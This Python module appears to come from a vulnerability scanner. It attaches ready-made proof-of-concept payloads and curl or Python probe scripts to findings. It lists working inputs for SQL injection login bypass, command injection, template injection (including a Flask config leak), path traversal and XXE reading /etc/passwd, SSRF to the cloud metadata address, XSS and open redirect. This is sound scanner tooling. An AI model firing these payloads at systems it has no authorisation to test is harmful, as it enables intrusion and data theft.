#!/usr/bin/env python3
"""GSC Deterministic PoC Generators — no LLM required.

For well-known vulnerability classes, PoCs are trivially pattern-based.
These don't need DeepSeek — they're instant, cheap, and 100% reproducible.

Supported:
  SSTI: {{7*7}} → 49 → confirmed RCE
  Command Injection: $(echo VULNERABLE) → VULNERABLE → confirmed
  SQLi: ' OR '1'='1 → authentication bypass pattern
  Path Traversal: ../../etc/passwd → root:x:0:0 → confirmed
"""

from __future__ import annotations

# Mapping: rule_id prefix → (kind, payload, success_marker, format)
DETERMINISTIC_RULES: dict[str, tuple[str, str, str, str]] = {
    "YAML-SSTI001": (
        "ssti",
        "{{ 7 * 7 }}",
        "49",
        "curl"
    ),
    "GS020": (
        "xss",
        "<script>alert(1)</script>",
        "<script>alert(1)</script>",
        "curl"
    ),
    "YAML-A7E2F001": (
        "command_injection",
        "$(echo VULNERABLE)",
        "VULNERABLE",
        "curl"
    ),
    "GS025-command_injection": (
        "command_injection",
        "; echo VULNERABLE #",
        "VULNERABLE",
        "curl"
    ),
    "GS004": (
        "command_injection",
        "; id",
        "uid=",
        "curl"
    ),
    "GS005": (
        "sql_injection",
        "' OR '1'='1",
        "PWNED",
        "curl"
    ),
    "GS007": (
        "idor",
        "2",
        "secret",
        "curl"
    ),
    "GS021": (
        "ssrf",
        "http://127.0.0.1/secret",
        "TOP_SECRET",
        "curl"
    ),
    "GS022": (
        "open_redirect",
        "http://evil.example.com",
        "evil.example.com",
        "curl"
    ),
}

# SSTI: different template engines, same logic
SSTI_PAYLOADS = [
    ("{{ 7 * 7 }}", "49", "Jinja2/Django — basic arithmetic"),
    ("{{ config }}", "SECRET_KEY|DEBUG|SQLALCHEMY", "Flask config leak"),
    ("${7*7}", "49", "Freemarker — basic arithmetic"),
    ("<%= 7*7 %>", "49", "ERB/eRuby — basic arithmetic"),
]

# Command injection: OS-agnostic patterns
CMD_INJECTION_PAYLOADS = [
    ("$(echo VULNERABLE)", "VULNERABLE", "Unix — subshell echo"),
    ("; echo VULNERABLE #", "VULNERABLE", "Unix — semicolon echo"),
    ("| echo VULNERABLE", "VULNERABLE", "Unix — pipe echo"),
    ('`echo VULNERABLE`', "VULNERABLE", "Unix — backtick echo"),
    ('& echo VULNERABLE &', "VULNERABLE", "Windows — ampersand echo"),
]

# SQLi: login bypass / data extraction
SQLI_PAYLOADS = [
    ("' OR '1'='1", "logged in|welcome|success", "SQLi — OR 1=1 bypass"),
    ("' OR 1=1 --", "logged in|welcome|success", "SQLi — OR 1=1 comment"),
    ("admin' --", "logged in|welcome|success", "SQLi — admin bypass"),
    ("' UNION SELECT 1,2,3 --", "2", "SQLi — UNION column count"),
]

# Path Traversal
PATH_TRAVERSAL_PAYLOADS = [
    ("../../etc/passwd", "root:x:0:0", "Linux — /etc/passwd"),
    ("../../../etc/passwd", "root:x:0:0", "Linux — deep traversal"),
    ("..\\..\\..\\windows\\win.ini", "[fonts]", "Windows — win.ini"),
]

# XSS (reflected/stored) — unescaped <script> in response
XSS_PAYLOADS = [
    ("<script>alert(1)</script>", "<script>alert(1)</script>", "Reflected XSS — script echoed unescaped"),
    ("<img src=x onerror=alert(1)>", "<img src=x", "Reflected XSS — onerror handler"),
]

# SSRF — force server to fetch internal resource
SSRF_PAYLOADS = [
    ("http://127.0.0.1/secret", "TOP_SECRET", "SSRF — loopback internal endpoint"),
    ("http://169.254.169.254/latest/meta-data/", "instance-id", "SSRF — cloud metadata"),
]

# IDOR — access another user's resource without ownership check
IDOR_PAYLOADS = [
    ("2", "secret", "IDOR — access object id=2 without authorization"),
]

# Unsafe deserialization — pickle payload that reveals a marker
DESER_PAYLOADS = [
    ("__reduce__", "DESER_PWNED", "Unsafe deserialization — pickle __reduce__ executed"),
]

# XXE — external entity reads local file
XXE_PAYLOADS = [
    ("<!ENTITY xxe SYSTEM \"file:///etc/passwd\">", "root:", "XXE — external entity reads /etc/passwd"),
]

# Open redirect — next param redirects to external host
REDIRECT_PAYLOADS = [
    ("http://evil.example.com", "evil.example.com", "Open redirect — Location header to external host"),
]


class DeterministicPoC:
    """A deterministic (non-LLM) proof-of-concept."""

    def __init__(self, payload: str, marker: str, kind: str, fmt: str = "curl"):
        self.payload = payload
        self.marker = marker
        self.kind = kind
        self.fmt = fmt
        self.impact = f"{kind}: payload '{payload}' should reveal '{marker}'"

    def to_dict(self) -> dict:
        return {
            "code": self._generate_code(),
            "impact": self.impact,
            "fmt": self.fmt,
            "payload": self.payload,
            "marker": self.marker,
            "deterministic": True,
        }

    def _generate_code(self) -> str:
        """Generate executable PoC code based on kind."""
        if self.fmt == "curl":
            # Curl-based PoC — inject payload into a URL query parameter via
            # --data-urlencode so spaces/metachars ({{ 7 * 7 }}, ' OR '1'='1)
            # are percent-encoded and reach the server intact.
            return (
                f"# Deterministic {self.kind} PoC\n"
                f"# Replace TARGET_URL with the actual endpoint\n"
                f"# Payload: {self.payload}\n"
                f"curl -s -G 'TARGET_URL' --data-urlencode \"input={self.payload}\" "
                f"| grep -q '{self.marker}' "
                f"&& echo VULNERABLE && exit 0 "
                f"|| echo SAFE && exit 1"
            )
        if self.fmt == "python":
            return (
                f"# Deterministic {self.kind} PoC\n"
                f"import sys, subprocess\n"
                f"result = subprocess.run(\n"
                f"    ['curl', '-s', f'TARGET_URL?input={self.payload}'],\n"
                f"    capture_output=True, text=True\n"
                f")\n"
                f"if '{self.marker}' in result.stdout:\n"
                f"    print('VULNERABLE'); sys.exit(0)\n"
                f"print('SAFE'); sys.exit(1)"
            )
        return f"# {self.kind} PoC: {self.payload}\n"


def get_deterministic_poc(rule_id: str, title: str = "") -> DeterministicPoC | None:
    """Get a deterministic PoC for a given rule_id. Returns None if not available.

    title is used for the keyword fallback (multi-class rules like GS037 where the
    rule_id alone doesn't distinguish SSTI/pickle/XXE/path-traversal).
    """
    for prefix, (kind, payload, marker, fmt) in DETERMINISTIC_RULES.items():
        if rule_id.startswith(prefix):
            return DeterministicPoC(payload, marker, kind, fmt)

    # Fallback: check title (or rule_id) for vulnerability-class keywords
    title_lower = (title or rule_id).lower()
    if any(kw in title_lower for kw in ("ssti", "template_injection", "jinja2", "render_template")):
        payload, marker, _ = SSTI_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "ssti")

    if any(kw in title_lower for kw in ("command_injection", "os.system", "exec", "reverse_shell")):
        payload, marker, _ = CMD_INJECTION_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "command_injection")

    if any(kw in title_lower for kw in ("sql_injection", "sqli")):
        payload, marker, _ = SQLI_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "sqli")

    if any(kw in title_lower for kw in ("traversal", "lfi", "directory_traversal", "path_join")):
        payload, marker, _ = PATH_TRAVERSAL_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "path_traversal")

    if any(kw in title_lower for kw in ("xss", "cross_site", "cross-site", "script_injection")):
        payload, marker, _ = XSS_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "xss")

    if any(kw in title_lower for kw in ("ssrf", "server_side_request", "server-side")):
        payload, marker, _ = SSRF_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "ssrf")

    if any(kw in title_lower for kw in ("idor", "insecure_direct_object", "broken_access", "ownership")):
        payload, marker, _ = IDOR_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "idor")

    if any(kw in title_lower for kw in ("deserialization", "pickle", "unpickle", "marshal", "unsafe_deserial")):
        payload, marker, _ = DESER_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "deserialization")

    if any(kw in title_lower for kw in ("xxe", "xml_external", "external_entity", "entity_expansion")):
        payload, marker, _ = XXE_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "xxe")

    if any(kw in title_lower for kw in ("open_redirect", "unvalidated_redirect", "redirect_injection")):
        payload, marker, _ = REDIRECT_PAYLOADS[0]
        return DeterministicPoC(payload, marker, "open_redirect")

    return None


def attach_deterministic_pocs(findings: list[dict]) -> list[dict]:
    """Attach deterministic PoCs to findings that support them. Mutates in-place."""
    count = 0
    for f in findings:
        rule_id = f.get("rule_id", "") or ""
        title = f.get("title", f.get("pattern_title", "")) or ""
        poc = get_deterministic_poc(rule_id, title)
        if poc:
            f.setdefault("metadata", {})["poc"] = poc._generate_code()
            f["metadata"]["poc_payload"] = poc.payload
            f["metadata"]["poc_impact"] = poc.impact
            f["metadata"]["poc_format"] = poc.fmt
            f["metadata"]["poc_deterministic"] = True
            count += 1
    return findings


# ── Test ───────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Test deterministic PoCs
    tests = [
        ("YAML-SSTI001", "SSTI detector"),
        ("GS020", "GS020 XSS/SSTI"),
        ("YAML-A7E2F001", "Reverse shell"),
        ("GS005", "SQLi — NO deterministic yet"),
        ("GS001", "Secrets — NO deterministic"),
    ]
    for rule_id, label in tests:
        poc = get_deterministic_poc(rule_id)
        status = "✅" if poc else "❌"
        print(f"{status} {label} ({rule_id})")
        if poc:
            print(f"   payload={poc.payload} marker={poc.marker}")

    # Test attachment
    findings = [
        {"rule_id": "YAML-SSTI001", "file_path": "app.py", "line": 42},
        {"rule_id": "YAML-A7E2F001", "file_path": "shell.py", "line": 10},
        {"rule_id": "GS005", "file_path": "db.py", "line": 5},  # no deterministic
    ]
    attach_deterministic_pocs(findings)
    for f in findings:
        if "metadata" in f:
            print(f"Attached: {f['rule_id']} → {f['metadata'].get('poc')}")
